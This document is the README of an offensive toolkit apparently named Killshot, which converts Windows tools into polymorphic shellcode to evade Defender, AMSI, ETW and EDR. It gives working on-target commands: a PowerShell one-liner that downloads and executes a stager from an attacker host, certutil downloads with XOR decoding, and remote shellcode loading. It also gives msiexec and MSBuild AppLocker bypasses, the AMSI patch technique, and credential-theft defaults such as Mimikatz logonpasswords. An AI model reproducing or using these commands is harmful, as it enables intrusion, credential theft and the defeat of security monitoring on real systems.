# Killshot

Polymorphic AV/AMSI bypass toolkit. Converts any Windows PE or .NET tool into
in-memory shellcode that bypasses Defender on fully-patched Windows 11 24H2.

**[Full Walkthrough & Tool Reference →](docs/walkthrough.md)**

## How It Works

```
PE/.NET binary ──► donut (shellcode) ──► XOR+base64 (.enc)
                                                │
                        ┌───────────────────────┘
                        ▼
             killshot stager [tool] --inline
                        │
          ┌─────────────┴──────────────────────┐
          │         PowerShell stager           │
          │  AMSI bypass (AmsiScanBuffer xor)   │
          │  SBL bypass  (PSEtwLogProvider=0)   │
          │  WinHTTP COM download (.enc)         │
          │  In-memory decode + C# inject        │
          └──────────────────────────────────────┘
                        │  ──OR──
                        ▼
             runner_c.dat (10KB C PE)
          ┌──────────────────────────────────────┐
          │  Indirect syscalls (Hell's Gate)      │
          │  ETW patch via NtProtectVirtualMemory │
          │  Pre-baked W^X stubs (RW→RX, no RWX) │
          │  Module stomping (wintrust/clbcatq)   │
          │  XOR sleep-re-encrypt (MARS evasion)  │
          │  Shellcode in RuntimeBroker.exe        │
          └──────────────────────────────────────┘
```

Every invocation is unique — randomised identifiers, XOR keys, fake MSVC Rich
header, XOR-encoded API strings. No two builds share a signature.

## Quick Start

```bash
# 1. Install
./install.sh

# 2. Build runner (once per engagement)
killshot generate --runner

# 3. Convert a tool to shellcode
killshot tool SharpUp --params "audit"
killshot tool Rubeus --params "kerberoast /nowrap"
killshot tool GodPotato --params '-cmd "cmd /c whoami"'

# 4. Generate stager (auto-detects workspace, embeds URLs)
killshot stager sharpup -l 10.10.14.5 --inline
killshot stager rubeus -l 10.10.14.5 --inline

# 5. Serve
killshot serve &

# 6. Execute on target (one-liner, works everywhere)
$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','http://LHOST:8000/stager_sharpup.ps1',$false);$h.Send();iex $h.ResponseText
```

## Commands

```bash
killshot help                              # Show help
killshot list                              # List available tools
killshot check                             # Verify installation

killshot generate --runner                 # Build polymorphic C runner
killshot generate --tools -l LHOST         # All tools to .enc shellcode
killshot generate --tool Rubeus            # Single tool
killshot generate --all -l LHOST           # Full pipeline (implant + runner + tools + stager)

killshot tool <name> [--params "..."]      # Convert tool → .enc
killshot stager <name> -l LHOST [--inline] # Generate PS1 stager for any .enc
killshot serve [port]                      # HTTP server for workspace
killshot amsi                              # Print AMSI bypass one-liner
killshot clean                             # Wipe workspace
```

### killshot stager options

| Flag | Default | Description |
|------|---------|-------------|
| `<name>` | required | Name matching the .enc file (e.g. `sharpup` → `sharpup.enc`) |
| `-l, --lhost IP` | `$LHOST` or `10.99.0.16` | Attacker IP embedded in download URLs |
| `-p, --port PORT` | `8000` | HTTP port |
| `--inline` | off | No runner PE on disk — full in-memory via C# Add-Type |
| `-o PATH` | `$WORKSPACE/stager_<name>.ps1` | Output path |

### killshot generate options

| Flag | Default | Description |
|------|---------|-------------|
| `-l, --lhost IP` | `10.99.0.16` | Callback/listener IP |
| `-p, --lport PORT` | `4444` | C2 listener port |
| `-h, --http PORT` | `8000` | HTTP file server port |
| `-f, --framework` | `sliver` | `sliver` or `msf` |
| `-t, --type` | `beacon` | `beacon` or `session` (Sliver) |
| `--proto` | `mtls` | `mtls`, `http`, or `https` (Sliver) |
| `--params PARAMS` | defaults | Params baked into tool shellcode |
| `-o, --output PATH` | auto | Output path for `--tool` / `--potato` |

## Toolkit

| Script | Purpose |
|--------|---------|
| `install.sh` | Downloads tools, installs Go/Donut/garble, verifies everything |
| `killshot.sh` | Main CLI — all subcommands |
| `killshot.py` | Converts individual tools to Donut shellcode (.enc) |
| `runner_c_builder.py` | Builds polymorphic 10KB C runner with indirect syscalls |
| `runner_src/runner_template.c` | C runner source (indirect syscalls, ETW, W^X stubs) |
| `gen_runner.py` | Generates polymorphic Go shellcode loader (alternative runner) |
| `gen_stager.py` | Generates PowerShell stager with AMSI+SBL bypass |
| `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
| `gen_msi.py` | MSI/DLL AppLocker bypass — embedded or staged (WinHTTP download) |
| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |

## Included Tools

### Credential Access
| Tool | Description | Default Params |
|------|-------------|----------------|
| Rubeus | Kerberos abuse | `triage` |
| Mimikatz | Credential extraction | `privilege::debug sekurlsa::logonpasswords exit` |
| SharpDPAPI | DPAPI credential extraction | `triage` |
| SharpChrome | Chrome saved credentials | `logins` |

### Enumeration
| Tool | Description | Default Params |
|------|-------------|----------------|
| SharpHound | BloodHound AD collector | `-c All --memcache` |
| Certify | AD CS certificate abuse | `find /vulnerable` |
| Seatbelt | Host security survey | `-group=all -full` |
| winPEAS | Privilege escalation scanner | (none) |
| ADSearch | Custom LDAP queries | — |
| SharpUp | Privesc checks | `audit` |
| SQLRecon | MSSQL enumeration + RCE | — |

### Privilege Escalation
| Tool | Description | Notes |
|------|-------------|-------|
| GodPotato | SeImpersonate → SYSTEM | Only reliable potato on Win11 24H2 |
| PrintSpoofer | SeImpersonate → SYSTEM | Requires Print Spooler enabled |
| BadPotato | SeImpersonate → SYSTEM | — |
| EfsPotato | SeImpersonate → SYSTEM | — |
| KrbRelayUp | Kerberos relay privesc | AD only |
| SharpGPOAbuse | GPO abuse | AD, requires GPO write |

### Lateral Movement & Tunneling
| Tool | Description | Default Params |
|------|-------------|----------------|
| Ligolo-ng agent | Layer 3 tunnel | `-connect LHOST:11601 -ignore-cert` |
| Chisel | SOCKS5 tunnel over HTTP | `client LHOST:8081 R:socks` |
| RunasCs | Execute as different user | — |

### Active Directory
| Tool | Description | Default Params |
|------|-------------|----------------|
| Whisker | Shadow Credentials | `list` |
| SharpGPOAbuse | GPO privilege escalation | — |

## On-Target Execution

### Inline mode (no files on disk)

```powershell
# One-liner — paste in any PS session or WinRM
$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','http://LHOST:8000/stager_sharpup.ps1',$false);$h.Send();iex $h.ResponseText
```

Change `stager_sharpup.ps1` to whatever stager you generated.

### Runner mode (PE on disk, output capture for long-running tools)

```powershell
# Download XOR-encoded runner
certutil -urlcache -split -f http://LHOST:8000/runner_c.dat %TEMP%\r.enc

# Decode
$d=[IO.File]::ReadAllBytes("$env:TEMP\r.enc");$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor 0x5A};[IO.File]::WriteAllBytes("$env:TEMP\r.exe",$o)

# Run any tool
%TEMP%\r.exe -remote http://LHOST:8000/sharpup.enc
%TEMP%\r.exe -remote http://LHOST:8000/rubeus.enc
%TEMP%\r.exe -remote http://LHOST:8000/godpotato.enc
```

### AppLocker bypass (no PS execution policy, no runner needed)

```powershell
# MSI — msiexec is always whitelisted
certutil -urlcache -split -f http://LHOST:8000/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn

# MSBuild
certutil -urlcache -split -f http://LHOST:8000/build.xml %TEMP%\b.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml
```

## Evasion Techniques

| Technique | What It Defeats |
|-----------|----------------|
| AMSI bypass v6 (AmsiScanBuffer `xor eax,eax; ret`) | PowerShell AMSI scan, script block inspection |
| Script Block Logging bypass (PSEtwLogProvider.m_enabled=0) | EDR PowerShell telemetry |
| WinHTTP COM download (no Net.WebClient) | SSPI/WebClient telemetry hooks |
| Indirect syscalls via Hell's Gate + Halo's Gate | Userland API hooks (EDR inline hooks) |
| Pre-baked W^X stubs (RW→RX, no RWX ever) | RWX memory behavioral detection |
| ETW patch via NtProtectVirtualMemory (indirect syscall) | ETW telemetry from runner process |
| Module stomping (wintrust/clbcatq) | Memory scan of shellcode region |
| XOR sleep-re-encrypt | MARS time-based memory scanning |
| Fake MSVC 2022 Rich header | PE origin fingerprinting (Bearfoos.A!ml) |
| No CRT imports (only KERNEL32.dll) | ML models keyed on import table shape |
| Polymorphic build (random identifiers, XOR keys) | Signature-based static detection |
| XOR-encoded .enc files | Signature detection of shellcode on disk |

## Directory Structure

```
avbypass/
├── install.sh                  # Installer
├── killshot.sh                 # Main CLI (symlinked to /usr/local/bin/killshot)
├── killshot.py                 # Tool → shellcode converter
├── runner_c_builder.py         # C runner builder (polymorphic 10KB PE)
├── runner_src/
│   └── runner_template.c       # C runner source (indirect syscalls, ETW, W^X)
├── gen_runner.py               # Go runner generator (alternative)
├── gen_stager.py               # PowerShell stager generator
├── gen_potato.py               # Potato exploit generator
├── gen_msi.py                  # MSI/DLL AppLocker bypass
├── gen_applocker.py            # MSBuild/InstallUtil AppLocker bypass
├── docs/
│   └── walkthrough.md          # Full step-by-step walkthrough with actual output
├── tools/
│   ├── potatoes/               # Potato exploit binaries
│   └── windows/                # Offensive tool binaries
└── go/                         # Local Go toolchain (after install)
```

Workspace output (auto-detected, defaults to `~/.exegol/workspaces/<active>/killshot/`):
```
killshot/
├── runner_c.dat                # XOR-encoded C runner (serves as-is)
├── runner.exe                  # Go runner (alternative)
├── implant.enc                 # C2 implant shellcode
├── stager_<name>.ps1           # Per-tool stager scripts
├── *.enc                       # Tool shellcode files
├── update.msi                  # MSI AppLocker bypass
├── build.xml                   # MSBuild AppLocker bypass
└── service.cs                  # InstallUtil AppLocker bypass
```

## Requirements

| Component | Required | Purpose |
|-----------|----------|---------|
| Python 3 | Yes | All generators |
| gcc-mingw-w64 | Yes | C runner cross-compilation |
| Go 1.25.x | Yes | Go runner cross-compilation (1.26+ breaks garble) |
| donut-shellcode | Yes | PE-to-shellcode conversion |
| garble | Yes | Go binary obfuscation |
| msibuild (msitools) | Optional | MSI packaging |
| Sliver or MSF | Yes* | C2 implant generation |

*Only for implant generation. All offensive tools work independently via `killshot tool`.

## Tested On

- **Windows 11 24H2 (Build 26200)** — Defender real-time ON, cloud protection ON, TamperProtection ON, RunAsPPL=2, zero exclusions
  - SharpUp, Seatbelt v1.2.2, Rubeus v2.3.3, SharpHound v2.10.0, Certify, Whisker, KrbRelayUp, SharpGPOAbuse, SharpDPAPI, SharpChrome, SQLRecon, RunasCs, Mimikatz, winPEAS, Chisel, Ligolo-ng — all executed cleanly
  - GodPotato confirmed SYSTEM (from SeImpersonatePrivilege context)
  - Sliver mTLS session confirmed
  - Zero Defender quarantine events
- **Windows Server 2022** — Defender default settings

See [docs/walkthrough.md](docs/walkthrough.md) for validated command output.
